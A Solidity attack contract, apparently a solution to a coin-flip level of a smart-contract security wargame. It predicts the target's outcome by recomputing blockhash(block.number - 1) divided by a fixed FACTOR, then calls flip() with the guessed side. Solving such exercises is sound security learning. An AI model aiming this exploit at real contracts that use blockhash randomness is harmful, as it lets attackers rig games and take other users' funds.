// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_03_CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipAttack(address _coinFlipAddress) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlip CFContract = CoinFlip(_coinFlipAddress);
        bool win = CFContract.flip(side);
        return win;
    }
}
